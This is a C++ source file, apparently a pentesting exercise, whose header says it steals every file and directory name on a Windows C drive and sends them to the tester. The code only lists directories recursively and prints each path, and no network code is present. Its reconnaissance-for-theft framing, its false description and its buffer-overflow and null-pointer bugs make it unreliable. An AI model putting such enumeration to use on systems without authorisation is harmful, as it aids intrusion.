/* 
   Description: A C++ program that steals all of the names of the files abd direcotries on a Windows C drive and sends it back to the pentester.
   Limitations: The program does not consider a directory name with 1 or more ".". This resulted on igonring what is under a directory with such a name.
   				Example: readme.txt is a file, readme is a directory, read.me (directory) is a file according to the program logic.
*/



#include <stdio.h>
#include <string>
using namespace std;
#include <winsock.h>
#include <dirent.h>

static void listdir(const char *path);
int checkforfiletype(string s);
int DirectoryExists( const char* pzPath );

int main() {
   
   listdir("C:\\");
   
   return(0);
}

static void listdir(const char  *path) 
{

	DIR *dr;
	struct dirent *en;
	dr = opendir(path); //open all or present directory
	printf("Current directory: %s\n", dr->dd_name);
	
	if (dr)
	{
    	while ((en = readdir(dr)) != NULL) {
			
			char path_copy[512];
			strcpy(path_copy, path);
				
			char *complete_path =  strcat(path_copy, "\\");
			complete_path = strcat(path_copy, en->d_name);
			
			printf("PATH: %s\n", complete_path);
				
			if ( checkforfiletype(en->d_name) == 0 && DirectoryExists(complete_path) == 1)
			{	
				printf("Last directory: %s\n", en->d_name);
				listdir(complete_path);	
				
			}
		
      }
      closedir(dr); //close all directory
      
    
   	}
   
}  

int DirectoryExists( const char* pzPath )
{
    if ( pzPath == NULL) return 0;

    DIR *pDir;
    int bExists = 0;

    pDir = opendir (pzPath);

    if (pDir != NULL)
    {
        bExists = 1;    
        (void) closedir (pDir);
    }

    return bExists;
}

int checkforfiletype(string s)
{
    if (s == "." || s == "..")
    	return 1;
    
	int n = s.length();
	int dot_counter = 0;
    for (int i = 1; i < n; i++)
    {
    	if (s[i] == '.')
            dot_counter++;
	}
 	
 	if (dot_counter >= 1)
 	{
 		printf("dot_counter: %d\n", dot_counter);
 		return 1;	
	}
 	
	        
    return 0;
}


